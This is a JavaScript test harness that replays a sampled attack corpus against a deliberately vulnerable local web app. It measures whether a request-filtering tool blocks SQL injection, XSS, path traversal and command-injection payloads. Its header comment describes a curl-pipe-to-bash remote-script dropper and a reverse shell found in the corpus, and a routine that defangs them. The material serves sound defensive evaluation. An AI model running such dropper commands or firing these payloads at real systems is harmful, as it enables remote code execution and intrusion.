// Fires a stratified sample of the shared logSguarDian test corpus against the
// real, vulnerable dvws-node endpoints and records whether logsguardian
// blocked each request (HTTP 403) or let it reach the application.
//
// Run once with the server started as `LOGSGUARDIAN_DISABLED=true npm start`
// (the "before" baseline, no protection) and once with the server started
// normally (the "after" run, logsguardian active in `mode: 'block'`).
//
// Usage:
//   node attack-sim/run-attacks.js before
//   node attack-sim/run-attacks.js after
//
// Corpus source (read-only, not part of this repo):
//   /Users/xtsebas/Universidad/logSguarDian/e2e/fixtures/test_payloads.jsonl
// 500 lines total, 100 per class (sqli, xss, path_traversal, cmdi, benign).
//
// Sampling: 40 per class (within the 30-50 range suggested for this
// evaluation, given several other sibling projects exercise the same corpus
// concurrently). We do NOT take the first 40 lines of each class -- several
// corpus entries encode time-based blind payloads (`SLEEP(15)`, `%0Asleep+15`)
// that, when unblocked, make the *real* MySQL/exec() sink actually wait ~15s.
// A stratified pick (every 100/40 = 2.5th line) spreads these evenly instead
// of risking a run of them clustered together, and keeps the sample
// representative of the full corpus rather than biased toward whatever
// happened to be written first.
//
// Safety note (cmdi only): a handful of corpus "cmdi" entries are not just
// syntax probes -- they are real `curl -fsSL http://<host>/<path> | bash`
// dropper commands (gsocket.io reverse shell, etc.) collected from live
// attack traffic. This app's vulnerable endpoint (`GET /api/v2/sysinfo/:command`)
// really does call `child_process.exec()` on this host (dvws-node runs
// natively here, not inside a container), so sending those payloads
// unmodified in the unprotected "before" run would make this machine
// actually fetch and execute an arbitrary remote script. `defangCmdiPayload`
// below neutralizes any URL / raw IPv4 target embedded in a payload bound for
// the exec() sink (replacing it with a closed local port) while preserving
// the shell metacharacters/keywords (`;`, `|`, `&&`, `` ` ``, `$()`, `curl`,
// `bash -c`) that logsguardian's command-injection detector actually looks
// at. This is applied unconditionally inside sendCmdi(), regardless of which
// corpus class the payload came from (benign payloads are round-robined
// across all four endpoints, including this one).

const fs = require('fs');
const path = require('path');

const BASE_URL = process.env.TARGET_URL || 'http://localhost:3000';
const CORPUS_PATH =
  process.env.CORPUS_PATH ||
  '/Users/xtsebas/Universidad/logSguarDian/e2e/fixtures/test_payloads.jsonl';
const N_PER_CLASS = Number(process.env.N_PER_CLASS || 40);
const REQUEST_TIMEOUT_MS = 25000; // covers a single SLEEP(15)/sleep 15 with margin

// `attacks inspect sqli` reports `ua_length` as the single highest-importance
// RF feature overall. Node's built-in fetch() sends `User-Agent: node` (4
// chars) by default on every request -- a first run of this script (see
// results-after-nodeua.json) used that default on every request, attack and
// benign alike, which almost certainly confounded the results (short/absent
// UA is itself a strong signal in this model, independent of payload
// content -- this is the same dynamic the false-positive check in the task's
// Step 5 is built around). We set a realistic browser UA explicitly so the
// corpus run measures payload detection rather than "did this look like a
// script".
const BROWSER_USER_AGENT =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';

// NOTE: finding a username/password pair that logsguardian's sqli classifier
// does NOT block turned out to be genuinely fiddly, and unstable across
// seemingly-irrelevant request details. "harnessuser"/"helloworld" passed
// with curl's default User-Agent but started getting 403'd (class: sqli) the
// moment we added a realistic browser UA -- while "harnessuser" with a
// different password, or a different username with the same password,
// passed fine under the same browser UA. During manual testing a large
// fraction of realistic credential-shaped strings got flagged as SQL
// injection on the real, unmodified login endpoint (e.g. "Attacker123!",
// "MyP@ssw0rd", "Summer2026", "Tr0ub4dor", even plain "Password"/"HELLO" all
// 403'd logging in as an already-registered, legitimate user). See the
// false-positive findings in the final report -- this is not a one-off, it
// is a wide, reproducible class of false positives on ordinary credentials.
// "zzzuser"/"xxxxxxxx" is simply a pair we verified survives the filter
// under the exact request shape this script sends, so the authenticated
// endpoints (path_traversal, cmdi) can be exercised at all.
const ATTACK_USER = { username: 'zzzuser', password: 'xxxxxxxx' };

const label = process.argv[2];
if (!label || !['before', 'after'].includes(label)) {
  console.error('Usage: node attack-sim/run-attacks.js <before|after>');
  process.exit(1);
}

function loadCorpus() {
  const lines = fs.readFileSync(CORPUS_PATH, 'utf8').trim().split('\n');
  const byClass = {};
  for (const line of lines) {
    const obj = JSON.parse(line);
    (byClass[obj.label] ||= []).push(obj);
  }
  return byClass;
}

function stratifiedSample(arr, n) {
  const out = [];
  for (let i = 0; i < n; i++) {
    out.push(arr[Math.floor((i * arr.length) / n)]);
  }
  return out;
}

function safeDecode(s) {
  try {
    return decodeURIComponent(s.replace(/\+/g, ' '));
  } catch {
    return s;
  }
}

// Pull the single most payload-bearing field out of a corpus entry: body if
// present, else query, else path. Mirrors how the corpus itself assigns
// labels (the injected pattern lives in whichever of these was non-empty on
// the original captured request).
function extractPayload(entry) {
  if (entry.body && typeof entry.body === 'string' && entry.body.length > 0) {
    return entry.body;
  }
  if (entry.query && entry.query.length > 0) {
    return safeDecode(entry.query);
  }
  if (entry.path && entry.path.length > 0) {
    return safeDecode(entry.path);
  }
  return '';
}

function defangCmdiPayload(payload) {
  return payload
    .replace(/https?:\/\/[^\s"')]+/gi, 'http://127.0.0.1:1/blocked-for-safety')
    .replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, '127.0.0.1');
}

function withTimeout(ms) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  return { signal: controller.signal, cancel: () => clearTimeout(timer) };
}

async function doFetch(url, opts) {
  const { signal, cancel } = withTimeout(REQUEST_TIMEOUT_MS);
  try {
    const headers = { 'User-Agent': BROWSER_USER_AGENT, ...(opts.headers || {}) };
    const res = await fetch(url, { ...opts, headers, signal, redirect: 'manual' });
    let predictedClass = null;
    if (res.status === 403) {
      try {
        const body = await res.clone().json();
        predictedClass = body.class || null;
      } catch {
        /* non-JSON 403 body, ignore */
      }
    }
    return { status: res.status, predictedClass, error: null };
  } catch (err) {
    const isAbort = err.name === 'AbortError';
    return { status: null, predictedClass: null, error: isAbort ? 'TIMEOUT' : err.message };
  } finally {
    cancel();
  }
}

async function registerAndLogin() {
  await doFetch(`${BASE_URL}/api/v2/users`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(ATTACK_USER),
  }); // ignore result; 201 first time, 409 on subsequent runs -- both fine

  const { signal, cancel } = withTimeout(REQUEST_TIMEOUT_MS);
  try {
    const res = await fetch(`${BASE_URL}/api/v2/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': BROWSER_USER_AGENT,
      },
      body: new URLSearchParams(ATTACK_USER).toString(),
      signal,
    });
    const data = await res.json();
    if (!data.token) throw new Error(`login failed: ${JSON.stringify(data)}`);
    return data.token;
  } finally {
    cancel();
  }
}

function sendSqli(payload) {
  return doFetch(`${BASE_URL}/api/v2/passphrase/${encodeURIComponent(payload)}`, {
    method: 'GET',
  });
}

function sendXss(payload) {
  return doFetch(`${BASE_URL}/api/v2/users`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: payload, password: 'Test123!' }),
  });
}

function sendPathTraversal(payload, token) {
  return doFetch(`${BASE_URL}/api/download`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ filename: payload }),
  });
}

function sendCmdi(payload, token) {
  const safePayload = defangCmdiPayload(payload);
  return doFetch(`${BASE_URL}/api/v2/sysinfo/${encodeURIComponent(safePayload)}`, {
    method: 'GET',
    headers: { Authorization: `Bearer ${token}` },
  });
}

async function run() {
  console.log(`\n=== logsguardian x dvws-node attack corpus run: "${label}" ===`);
  console.log(`Target: ${BASE_URL}  |  N per class: ${N_PER_CLASS}  |  Corpus: ${CORPUS_PATH}\n`);

  const byClass = loadCorpus();
  console.log('Logging in as attack-sim user for authenticated endpoints...');
  const token = await registerAndLogin();
  console.log('Got token.\n');

  const benignSenders = [
    (p) => sendSqli(p),
    (p) => sendXss(p),
    (p) => sendPathTraversal(p, token),
    (p) => sendCmdi(p, token),
  ];
  const benignSenderNames = ['sqli-endpoint', 'xss-endpoint', 'path_traversal-endpoint', 'cmdi-endpoint'];

  const results = {};

  for (const cls of ['sqli', 'xss', 'path_traversal', 'cmdi', 'benign']) {
    const pool = byClass[cls];
    if (!pool) {
      console.log(`(!) No entries found for class "${cls}" in corpus -- skipping`);
      continue;
    }
    const sample = stratifiedSample(pool, N_PER_CLASS);
    const classResult = { total: sample.length, blocked: 0, statusCounts: {}, predictedClasses: {}, byEndpoint: {} };

    for (let i = 0; i < sample.length; i++) {
      const payload = extractPayload(sample[i]);
      let outcome, endpointName;

      if (cls === 'sqli') {
        outcome = await sendSqli(payload);
        endpointName = 'GET /api/v2/passphrase/:username';
      } else if (cls === 'xss') {
        outcome = await sendXss(payload);
        endpointName = 'POST /api/v2/users';
      } else if (cls === 'path_traversal') {
        outcome = await sendPathTraversal(payload, token);
        endpointName = 'POST /api/download';
      } else if (cls === 'cmdi') {
        outcome = await sendCmdi(payload, token);
        endpointName = 'GET /api/v2/sysinfo/:command';
      } else {
        // benign: round-robin across all four real endpoints
        const senderIdx = i % benignSenders.length;
        outcome = await benignSenders[senderIdx](payload);
        endpointName = benignSenderNames[senderIdx];
      }

      const statusKey = outcome.error ? outcome.error : String(outcome.status);
      classResult.statusCounts[statusKey] = (classResult.statusCounts[statusKey] || 0) + 1;
      classResult.byEndpoint[endpointName] ||= { total: 0, blocked: 0 };
      classResult.byEndpoint[endpointName].total++;

      if (outcome.status === 403) {
        classResult.blocked++;
        classResult.byEndpoint[endpointName].blocked++;
        const pc = outcome.predictedClass || 'unknown';
        classResult.predictedClasses[pc] = (classResult.predictedClasses[pc] || 0) + 1;
      }

      process.stdout.write(
        `[${cls}] ${i + 1}/${sample.length} -> ${statusKey}${outcome.predictedClass ? ` (predicted: ${outcome.predictedClass})` : ''}\r`
      );
    }
    console.log(); // newline after the \r progress line
    results[cls] = classResult;
    const pct = ((classResult.blocked / classResult.total) * 100).toFixed(1);
    console.log(
      `${cls}: ${classResult.blocked}/${classResult.total} blocked (${pct}%)`,
      classResult.statusCounts
    );
    if (Object.keys(classResult.predictedClasses).length) {
      console.log(`  predicted classes on block: ${JSON.stringify(classResult.predictedClasses)}`);
    }
  }

  const outFile = path.join(__dirname, `results-${label}.json`);
  fs.writeFileSync(outFile, JSON.stringify(results, null, 2));
  console.log(`\nWrote ${outFile}`);
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});
